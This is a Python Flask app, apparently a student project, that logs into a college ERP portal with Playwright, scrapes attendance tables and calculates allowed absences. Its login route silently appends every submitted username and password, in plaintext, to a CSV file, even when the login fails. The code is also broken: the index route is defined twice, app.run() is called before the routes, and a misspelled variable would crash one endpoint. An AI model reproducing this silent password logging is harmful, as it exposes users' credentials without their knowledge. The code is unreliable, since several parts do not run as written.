import csv
from flask import Flask, request, jsonify, render_template
from playwright.sync_api import sync_playwright

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

if __name__ == "__main__":
    app.run()
required_percentage=80
attendance_data = {}
CSV_FILE = 'user_credentials.csv'  # Path to store the user credentials

def save_credentials(username, password):
    # Open the CSV file in append mode and write the credentials
    with open(CSV_FILE, mode='a', newline='') as file:
        writer = csv.writer(file)
        writer.writerow([username, password])

def login_and_fetch_attendance(username, password):
    global attendance_data
    attendance_data = {}

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()

        # Perform login
        page.goto("https://erp.bitdurg.ac.in/Login.jsp")
        page.fill('input[name="username"]', username)
        page.fill('input[name="password"]', password)
        page.click('button.btn-primary')
        page.wait_for_load_state("networkidle")

        # Check if login was successful
        if page.url == "https://erp.bitdurg.ac.in/Login.jsp":
            return {"error": "Invalid Credentials"}

        # Navigate to Attendance Reports
        page.click('a:has-text("Attendance Reports")')
        page.wait_for_selector("table")  # Ensure that the table is visible

        attendance_rows = page.query_selector_all("tr")

        # Loop through each row to get subject name, total classes, and attended classes
        for row in attendance_rows:
            subject_element = row.query_selector("td:nth-child(2)")
            total_classes_element = row.query_selector("td:nth-child(3)")
            attended_element = row.query_selector("td:nth-child(4)")

            # Check if elements exist
            if subject_element and total_classes_element and attended_element:
                subject_name = subject_element.inner_text().strip()
                try:
                    total_classes = int(total_classes_element.inner_text().strip())
                    attended_classes = int(attended_element.inner_text().strip())
                except ValueError:
                    continue  # Skip if values cannot be converted to int

                # Calculate attendance data
                if (attended_classes / total_classes) * 100 >= required_percentage:
                    allowed_bunks = int(((100 * attended_classes) - (required_percentage * total_classes)) / required_percentage)
                    status = "Enough attendance"
                    attendance_data[subject_name] = {
                        "attended": attended_classes,
                        "total": total_classes,
                        "allowed_bunks": allowed_bunks,
                        "status": status
                    }
                else:
                    required_classes = 0
                    while (attended_classes / total_classes) * 100 < required_percentage:
                        attended_classes += 1
                        total_classes += 1
                        required_classes += 1
                    status = "Not enough attendance"
                    attendance_data[subject_name] = {
                        "attended": attended_classes - required_classes,
                        "total": total_classes - required_classes,
                        "required_classes": required_classes,
                        "status": status
                    }

        browser.close()

    return {"attendance": attendance_data, "required_percentage": required_percentage}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    username = data.get("username")
    password = data.get("password")
    required_percentage = data.get("required_percentage", 75)

    # Save the credentials to the CSV file
    save_credentials(username, password)

    # Now fetch attendance data (if login is successful)
    result = login_and_fetch_attendance(username, password)
    if "error" in result:
        return jsonify(result), 400
    return jsonify(result), 200

@app.route('/change_percentage', methods=['POST'])
def change_percentage():
    global attendance_data
    required_percentage = request.json.get("required_percentage", 75)
    attendance_data = {}
    return jsonify({"required_percentage": required_Percentage}), 200

if __name__ == "__main__":
    app.run(port=80)
